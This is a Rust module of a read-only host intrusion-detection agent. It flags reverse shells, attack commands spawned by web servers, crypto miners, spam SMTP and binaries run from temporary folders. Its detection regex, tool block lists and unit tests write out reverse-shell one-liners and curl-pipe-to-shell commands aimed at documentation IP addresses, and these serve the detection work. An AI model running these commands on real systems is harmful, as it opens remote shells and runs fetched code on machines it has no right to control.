//! Detections in the agent (plan stage C, first expansion stage):
//!
//! - **Process starts** via the kernel's proc connector (netlink, requires CAP_NET_ADMIN,
//!   no eBPF): web server/PHP starts a network tool or a typical attack command.
//! - **Reverse shell**: shell/interpreter whose stdin/stdout is an outgoing TCP connection.
//! - **Outgoing connections** (every 20 s): SMTP from a non-mail server (spam), mining ports/programs.
//!
//! - **Deploy activity** (info): deploy/update command started inside a known app root (`deploy`).
//!
//! Read only, block nothing. Every detection carries the process chain and a key for
//! deduplication on the server.

pub mod beacon;
pub mod deploy;
pub mod dns;
pub mod net;
pub mod proc;
pub mod procconn;

use std::collections::{HashMap, HashSet};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::OnceLock;
use std::time::{Duration, Instant};

use regex::Regex;
use tyrosd_proto::Detection;

/// Parent processes that handle web requests
const WEB: &[&str] = &["apache2", "httpd", "nginx", "php-fpm", "php", "php-cgi", "lsphp", "frankenphp", "uwsgi", "gunicorn", "node", "caddy", "lighttpd"];
/// Programs whose start from the web server is almost always an attack
const NET_TOOLS: &[&str] = &["nc", "ncat", "netcat", "nc.traditional", "nc.openbsd", "socat", "telnet", "nmap", "masscan"];
/// Shells and interpreters (reverse shell)
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "busybox", "python", "python2", "python3", "perl", "ruby", "php", "lua", "node", "nc", "ncat", "socat"];
/// Mail servers that are allowed to speak SMTP to the outside
const MTA: &[&str] = &["master", "smtp", "postfix", "exim", "exim4", "sendmail", "opensmtpd", "smtpd", "msmtp", "ssmtp", "nullmailer-send", "dma", "postdrop"];
/// known miner/malware program names
const MALWARE: &[&str] = &["xmrig", "kinsing", "kdevtmpfsi", "minerd", "cpuminer", "xmr-stak", "t-rex", "nbminer", "lolminer", "sysupdate", "networkservice", "kthreaddi", "dbused"];
/// Package management/installers: checked via the program file (`trust::installer_ancestor`), not via the name
use tyrosd_core::trust;

pub use deploy::set_app_roots;

/// Program file is in a temporary/hidden directory or was deleted after the start.
/// `pid`: process (for the AppImage check: the process's user must match the FUSE mount).
pub fn odd_exe(exe: &str, pid: Option<i32>) -> Option<&'static str> {
    // mounted AppImages (e.g. Collabora in Nextcloud) legitimately run from /tmp/.mount_* – only with a real FUSE mount
    // owned by root or by the process's user
    if trust::appimage_for(exe, pid) {
        return None;
    }
    if let Some(orig) = exe.strip_suffix(" (deleted)") {
        // replaced by an update (file is back, service just not restarted) → no suspicion.
        // Only in system directories: otherwise an attacker simply puts a file with the same name there after deleting.
        const SYS: &[&str] = &["/usr/", "/bin/", "/sbin/", "/lib/", "/lib64/", "/lib32/", "/libx32/", "/opt/"];
        if SYS.iter().any(|d| orig.starts_with(d)) && !orig.contains("/../") && std::path::Path::new(orig).exists() {
            return None;
        }
        return Some("Program file was deleted after start");
    }
    if ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/"].iter().any(|d| exe.starts_with(d)) {
        return Some("Program runs from a temporary folder");
    }
    const DEV: &[&str] = &["/.cache/", "/.local/", "/.nvm/", "/.cargo/", "/.rustup/", "/.vscode-server/", "/.cursor-server/", "/.pyenv/", "/.rbenv/", "/.deno/", "/.bun/",
        "/.sdkman/", "/.gradle/", "/.m2/", "/.npm/", "/.yarn/", "/.dotnet/", "/.config/", "/.volta/", "/.asdf/", "/.composer/", "/.wp-cli/"];
    if exe.contains("/.") && !DEV.iter().any(|d| exe.contains(d)) {
        return Some("Program is located in a hidden folder");
    }
    None
}

/// typical mining pool ports
/// (without 5555/6666/7777/9000 – legitimate services such as MinIO, Portainer, php-fpm often run there)
const MINING_PORTS: &[u16] = &[3333, 3334, 3357, 4444, 14433, 14444, 20580, 45560, 45700];

fn suspicious_cmd() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?i)/dev/(tcp|udp)/|\b(nc|ncat|netcat)\b.*\s-(e|c)\s|\b(bash|sh)\s+-i\b|python[0-9.]*\s+-c\s.*socket|perl\s+-e\s.*socket|socat\s.*exec|base64\s+(-d|--decode)|(curl|wget)\s[^|]*\|\s*(ba)?sh|chmod\s+\+x\s+/(tmp|dev/shm|var/tmp)|(^|[\s;&|('"`])mkfifo\s+\S|^\S*/mkfifo\s+\S|xmrig|stratum\+tcp|/tmp/\.[a-z0-9]"#,
        )
        .unwrap()
    })
}

/// The official tyrosec installer/update (`curl … https://get.tyrosec.com/install.sh | sh …`) is not a suspicious
/// command – but only if the command line fetches nothing but get.tyrosec.com addresses and nothing else suspicious
/// remains once the installer call is removed (an appended `; curl other | sh` is still reported).
pub fn official_installer(cmdline: &str) -> bool {
    static URL: OnceLock<Regex> = OnceLock::new();
    static PIPE: OnceLock<Regex> = OnceLock::new();
    let c = cmdline.to_lowercase();
    if !c.contains("https://get.tyrosec.com/install.sh") {
        return false;
    }
    let url = URL.get_or_init(|| Regex::new(r#"\b(https?|ftp)://[^\s'"|;&)]+"#).unwrap());
    if url.find_iter(&c).any(|m| !m.as_str().starts_with("https://get.tyrosec.com/") && !m.as_str().starts_with("https://ingest.tyrosec.com")) {
        return false;
    }
    let pipe = PIPE.get_or_init(|| Regex::new(r#"(curl|wget)\s[^|;&]*https://get\.tyrosec\.com/install\.sh[^|;&]*\|\s*(sudo\s+)?(ba)?sh\b"#).unwrap());
    !suspicious_cmd().is_match(&pipe.replace_all(&c, " "))
}

/// `base64 -d` alone is everyday use (apt-key, Google Chrome's cron script, certificate scripts).
/// It is suspicious when the result is executed directly: the calling shell command line pipes
/// it into an interpreter (`… | base64 -d | sh`) or evaluates it (`eval`, `$(… base64 -d …)`, `<(…)`).
/// Calls from the web server are not affected by this (rule 2 above, critical).
fn harmless_base64(hit: &str, pid: i32) -> bool {
    if !hit.to_ascii_lowercase().starts_with("base64") {
        return false;
    }
    // parent from /proc, or from the process memory if base64 (or its shell) has already exited
    let pp = tyrosd_core::procinfo::ppid(pid).or_else(|| tyrosd_core::proctable::get(pid, None).map(|e| e.ppid));
    let parent = pp
        .and_then(|pp| {
            std::fs::read(format!("/proc/{pp}/cmdline"))
                .ok()
                .map(|c| String::from_utf8_lossy(&c).replace('\0', " "))
                .or_else(|| tyrosd_core::proctable::get(pp, None).map(|e| e.cmdline))
        })
        .unwrap_or_default();
    !base64_executed(&parent)
}

/// Process whose ancestry is checked (installer, agent): the process itself while it runs, otherwise its nearest
/// ancestor that is still running (via the process memory) – package helpers like `tzdata.config` exit in
/// milliseconds while dpkg/apt still run.
fn anchor(pid: u32, gone: bool) -> i32 {
    if !gone {
        return pid as i32;
    }
    let mut cur = pid as i32;
    for _ in 0..16 {
        let Some(e) = tyrosd_core::proctable::get(cur, None) else { break };
        if e.ppid <= 1 {
            break;
        }
        cur = e.ppid;
        if std::path::Path::new(&format!("/proc/{cur}")).exists() {
            return cur;
        }
    }
    pid as i32
}

/// Does the command line execute decoded base64?
fn base64_executed(cmdline: &str) -> bool {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(r"(?i)base64\s+(-d|--decode)[^;&]*\|\s*(sudo\s+)?(\S*/)?(ba|da|z|k)?sh\b|base64\s+(-d|--decode)[^;&]*\|\s*(\S*/)?(python[0-9.]*|perl|php|ruby|node)\b|eval\b[^;]*base64\s+(-d|--decode)|(\$\(|`|<\()[^)`]*base64\s+(-d|--decode)")
            .unwrap()
    })
    .is_match(cmdline)
}

fn base(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

fn is_web(name: &str) -> bool {
    WEB.iter().any(|w| name == *w || name.starts_with(&format!("{w}-")) || (name.starts_with("php") && w == &"php"))
}

/// Evaluates a newly started process.
pub fn on_exec(pid: u32) -> Option<Detection> {
    let p = proc::info(pid)?;
    let exe = base(&p.exe).to_string();
    let chain = proc::chain(pid, 6);
    let anc = anchor(pid, p.gone);
    // parent chain without the process itself
    let parents: Vec<&String> = chain.iter().skip(1).collect();
    let web_parent = parents.iter().find(|c| is_web(c)).map(|s| s.to_string());

    // 1) Reverse shell: input/output is attached to an outgoing TCP connection
    if SHELLS.contains(&exe.as_str()) || SHELLS.contains(&p.comm.as_str()) {
        if let Some(remote) = net::stdio_remote(pid) {
            return Some(det("reverse_shell", "critical", format!("Reverse shell: {} with network connection to {remote}", p.comm),
                format!("{}\nInput/output is a TCP connection to {remote}", p.cmdline), &p, chain, format!("{}|{remote}", p.comm)));
        }
    }
    // 2) Web server starts a network tool or attack command
    if let Some(wp) = web_parent {
        let tool = NET_TOOLS.contains(&exe.as_str());
        if tool || suspicious_cmd().is_match(&p.cmdline) {
            return Some(det("web_spawned_attack", "critical", format!("{wp} starts a suspicious command: {}", p.comm),
                p.cmdline.clone(), &p, chain, format!("{wp}|{}", p.cmdline.chars().take(80).collect::<String>())));
        }
    }
    // 3) Program from /tmp, hidden or deleted; known miners
    if MALWARE.contains(&exe.as_str()) || MALWARE.contains(&p.comm.as_str()) {
        return Some(det("known_malware", "critical", format!("Known malware started: {}", p.comm), p.cmdline.clone(), &p, chain, p.comm.clone()));
    }
    if let Some(why) = odd_exe(&p.exe, (!p.gone).then_some(pid as i32)) {
        // package management (verified program, process or ancestor) or the agent itself
        if !trust::installer_ancestor(anc, 16) && !trust::own_descendant(anc, 16) {
            let web = parents.iter().any(|c| is_web(c));
            return Some(det("odd_exe", if web { "critical" } else { "high" }, format!("{why}: {}", p.comm),
                format!("{}\nProgram: {}", p.cmdline, p.exe), &p, chain, p.exe.trim_end_matches(" (deleted)").to_string()));
        }
    }
    // 4) Attack command without web server (e.g. via SSH or cron) – medium. Deduplicated by the
    //    matched pattern: "bash -c '… | base64 -d'" starts bash *and* base64 – one report is enough.
    //    Called by package management (e.g. apt-key → base64 -d during an update): not an attack.
    let cmd = trust::strip_appimages(&p.cmdline, (!p.gone).then_some(pid as i32));
    if let Some(m) = suspicious_cmd().find(&cmd).filter(|m| !harmless_base64(m.as_str(), pid as i32) && !official_installer(&cmd)) {
        // deeper than the displayed chain: dpkg → run-parts → initramfs-tools → update-initramfs → mkinitramfs → … → ln
        let by_installer = trust::installer_ancestor(anc, 16);
        // Exception only for the agent's own processes (PID chain), not for every command line containing "tyrosecd"
        if !trust::own_descendant(anc, 16) && !by_installer {
            let hit = m.as_str().to_lowercase();
            return Some(det("suspicious_command", "medium", format!("Suspicious command started: {}", hit.trim()),
                p.cmdline.clone(), &p, chain, hit));
        }
    }
    // 5) Deploy command inside an app root (info; key = app root, at most every 10 min via `run`)
    if deploy::deploy_command(&p.cmdline).is_some() {
        let roots = deploy::app_roots();
        if let Some((cmd, root)) = deploy::deploy_match(&p.cmdline, deploy::cwd(pid).as_deref(), &roots) {
            return Some(det("deploy_activity", "info", format!("Deploy command started: {cmd}"),
                format!("Command: {}
App root: {root}", p.cmdline), &p, chain, root));
        }
    }
    None
}

fn det(rule: &str, sev: &str, title: String, detail: String, p: &proc::Info, chain: Vec<String>, key: String) -> Detection {
    let detail = if p.gone { format!("{detail}\n(process had already exited – details from the agent's process memory)") } else { detail };
    Detection { rule: rule.into(), severity: sev.into(), title, detail: detail.chars().take(1000).collect(), pid: p.pid, exe: p.exe.clone(), proc_chain: chain, key }
}

#[cfg(test)]
mod installer_tests {
    use super::official_installer;

    #[test]
    fn official_installer_is_not_suspicious() {
        assert!(official_installer("bash -c set -e; curl -fsSL https://get.tyrosec.com/install.sh | sh -s -- --server=https://ingest.tyrosec.com 2>&1 | tail -4"));
        assert!(official_installer("curl -fsSL https://get.tyrosec.com/install.sh | sudo sh -s -- --token-file=/root/tyrosec.token"));
        assert!(!official_installer("curl -fsSL https://get.tyrosec.com/install.sh | sh; curl -s http://203.0.113.9/x | sh")); // guard:ok
        assert!(!official_installer("curl -fsSL https://get.tyrosec.com.evil.example/install.sh | sh"));
        assert!(!official_installer("curl -fsSL https://get.tyrosec.com/install.sh | sh; bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")); // guard:ok
        assert!(!official_installer("curl -fsSL https://example.com/install.sh | sh"));
    }
}

#[cfg(test)]
mod odd_tests {
    #[test]
    fn base64_only_suspicious_when_executed() {
        // everyday use: script decodes into a file or variable for further processing
        for c in ["/bin/sh /usr/bin/apt-key --quiet --readonly verify", "/bin/sh /etc/cron.daily/google-chrome", "bash -c base64 -d < key.b64 > key.gpg", ""] {
            assert!(!super::base64_executed(c), "{c}");
        }
        // executed: piped into a shell/interpreter or evaluated
        for c in ["bash -c echo ZWNobyBoaQ== | base64 -d | sh", "sh -c curl -s x | base64 --decode | /bin/bash", "bash -c echo x|base64 -d|python3",
            "bash -c eval \"$(echo eA== | base64 -d)\"", "sh -c $(echo eA== | base64 -d)", "bash -c bash <(echo eA== | base64 -d)"] {
            assert!(super::base64_executed(c), "{c}");
        }
    }

    #[test]
    fn mkfifo_only_as_command() {
        let r = super::suspicious_cmd();
        // as a command: directly, with a path, in a command chain (reverse shell pattern)
        assert!(r.is_match("mkfifo /tmp/f"));
        assert!(r.is_match("/usr/bin/mkfifo /tmp/f"));
        assert!(r.is_match("sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 1.2.3.4 4444 >/tmp/f"));
        assert!(r.is_match("bash -c 'mkfifo p && cat p'"));
        // only as a path in the argument (initramfs build under dpkg)
        assert!(!r.is_match("basename /usr/lib/klibc/bin/mkfifo"));
        assert!(!r.is_match("cp -a /usr/lib/klibc/bin/mkfifo /var/tmp/mkinitramfs_AbC123/bin"));
        assert!(!r.is_match("dpkg -L klibc-utils | grep mkfifo"));
    }

    #[test]
    fn odd_paths() {
        assert!(super::odd_exe("/tmp/.x/kworker", None).is_some());
        assert!(super::odd_exe("/usr/bin/bash (deleted)", None).is_none()); // replaced by an update
        assert!(super::odd_exe("/tmp/does-not-exist-xyz (deleted)", None).is_some());
        assert!(super::odd_exe("/tmp/.mount_CollabXy/usr/bin/coolwsd", None).is_some()); // not mounted → just a name
        assert!(super::odd_exe("/home/a/.cache/x", None).is_none());
        assert!(super::odd_exe("/usr/sbin/nginx", None).is_none());
        assert!(super::odd_exe("/var/www/.hidden/x", None).is_some());
        // deleted + file with the same name put back: treated as "replaced by an update" only in system directories
        let f = std::env::temp_dir().join(format!("odd-{}", std::process::id()));
        std::fs::write(&f, "x").unwrap();
        assert!(super::odd_exe(&format!("{} (deleted)", f.display()), None).is_some());
        std::fs::remove_file(&f).ok();
        assert!(super::odd_exe("/var/www/html/../../usr/bin/bash (deleted)", None).is_some());
    }
}

/// Periodic check: reverse shells (including ones created before the start) and outgoing connections.
pub fn sweep(seen: &mut HashSet<String>) -> Vec<Detection> {
    let mut out = Vec::new();
    let conns = net::established();
    if conns.is_empty() {
        return out;
    }
    let owners = net::socket_owners();
    let listening = net::listening_ports();
    let mut by_pid: HashMap<u32, Vec<&net::Conn>> = HashMap::new();
    for c in &conns {
        if let Some(pid) = owners.get(&c.inode) {
            by_pid.entry(*pid).or_default().push(c);
        }
    }
    for (pid, cs) in by_pid {
        let Some(p) = proc::info(pid) else { continue };
        let exe = base(&p.exe).to_string();
        for c in &cs {
            if c.remote_is_local() {
                continue;
            }
            let remote = c.remote();
            // Outgoing SMTP from a program that is not a mail server → suspected spam. Only port 25
            // (direct delivery to foreign mail servers, typical of spam scripts). 465/587 = sending via a
            // mailbox with login – WordPress SMTP plugins, Nextcloud, Laravel and scripts do that every day.
            if c.rport == 25 && !net::is_inbound(c, &listening) && !MTA.contains(&exe.as_str()) && !MTA.contains(&p.comm.as_str()) {
                push(&mut out, seen, det("smtp_non_mta", "high", format!("Suspected spam: {} connects to mail server {remote}", p.comm),
                    format!("{}\nSMTP connection (port {}) from a program that is not a mail server", p.cmdline, c.rport), &p, proc::chain(pid, 6), format!("{}|{}", p.comm, c.rport)));
            }
            // Mining: pool port or mining program. The pool port only counts for outgoing connections –
            // for incoming ones (e.g. SSH) the remote port is the client's random source port.
            let miner_cmd = p.cmdline.to_lowercase();
            if (MINING_PORTS.contains(&c.rport) && !net::is_inbound(c, &listening) && trust::benign(pid as i32).is_none()) || miner_cmd.contains("xmrig") || miner_cmd.contains("stratum") {
                let sev = if miner_cmd.contains("xmrig") || miner_cmd.contains("stratum") { "critical" } else { "high" };
                push(&mut out, seen, det("crypto_mining", sev, format!("Suspected mining: {} connects to {remote}", p.comm),
                    format!("{}\nDestination port {} is typical of mining pools", p.cmdline, c.rport), &p, proc::chain(pid, 6), format!("{}|{remote}", p.comm)));
            }
        }
        // program from /tmp or deleted opens outgoing connections (malware, remote control)
        if let Some(why) = odd_exe(&p.exe, Some(pid as i32)) {
            if let Some(c) = cs.iter().find(|c| !c.remote_is_local()) {
                push(&mut out, seen, det("odd_exe_network", "critical", format!("{why} and connects to the outside: {}", p.comm),
                    format!("{}\nProgram: {}\nConnection to {}", p.cmdline, p.exe, c.remote()), &p, proc::chain(pid, 6), format!("{}|{}", p.exe, c.remote())));
            }
        }
        // reverse shell created before the agent started
        if SHELLS.contains(&exe.as_str()) || SHELLS.contains(&p.comm.as_str()) {
            if let Some(remote) = net::stdio_remote(pid) {
                push(&mut out, seen, det("reverse_shell", "critical", format!("Reverse shell: {} with network connection to {remote}", p.comm),
                    format!("{}\nInput/output is a TCP connection to {remote}", p.cmdline), &p, proc::chain(pid, 6), format!("{}|{remote}", p.comm)));
            }
        }
    }
    out
}

fn push(out: &mut Vec<Detection>, seen: &mut HashSet<String>, d: Detection) {
    // report only once per key in the agent (the server deduplicates as well)
    if seen.insert(format!("{}|{}", d.rule, d.key)) {
        out.push(d);
    }
}

/// Start detection: process starts (if the proc connector is available) + periodic check.
pub fn run(stop: &'static AtomicBool, emit: impl Fn(Detection) + Send + Sync + 'static) {
    let emit = std::sync::Arc::new(emit);
    {
        let emit = emit.clone();
        std::thread::Builder::new()
            .name("detect-exec".into())
            .spawn(move || {
                let mut recent: HashMap<String, Instant> = HashMap::new();
                let r = procconn::listen(stop, |pid| {
                    if let Some(d) = on_exec(pid) {
                        // the same detection at most every 10 min
                        let k = format!("{}|{}", d.rule, d.key);
                        if recent.get(&k).map(|t| t.elapsed() > Duration::from_secs(600)).unwrap_or(true) {
                            recent.insert(k, Instant::now());
                            emit(d);
                        }
                    }
                });
                if let Err(e) = r {
                    eprintln!("[tyrosecd] process starts not available ({e}) – periodic check only");
                }
            })
            .ok();
    }
    std::thread::Builder::new()
        .name("detect-sweep".into())
        .spawn(move || {
            let mut seen = HashSet::new();
            let mut last_reset = Instant::now();
            while !stop.load(Ordering::Relaxed) {
                for d in sweep(&mut seen) {
                    emit(d);
                }
                if last_reset.elapsed() > Duration::from_secs(6 * 3600) {
                    seen.clear(); // report persisting findings again every 6 h
                    last_reset = Instant::now();
                }
                for _ in 0..5 {
                    // every 5 s (plan "security": outgoing connections in near real time)
                    if stop.load(Ordering::Relaxed) {
                        return;
                    }
                    std::thread::sleep(Duration::from_secs(1));
                }
            }
        })
        .ok();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn suspicious_patterns() {
        for c in ["bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc -e /bin/sh 1.2.3.4 4444", "curl http://x/y.sh | bash", "python3 -c import socket,os;s=socket.socket()", "chmod +x /tmp/.x", "./xmrig -o stratum+tcp://pool"] {
            assert!(suspicious_cmd().is_match(c), "{c}");
        }
        for c in ["sh -c /usr/sbin/sendmail -t -i", "convert in.jpg out.png", "git pull", "bash /usr/local/bin/backup.sh"] {
            assert!(!suspicious_cmd().is_match(c), "{c}");
        }
    }

    #[test]
    fn web_parents() {
        assert!(is_web("php-fpm8.3"));
        assert!(is_web("php8.2"));
        assert!(is_web("apache2"));
        assert!(!is_web("sshd"));
    }
}
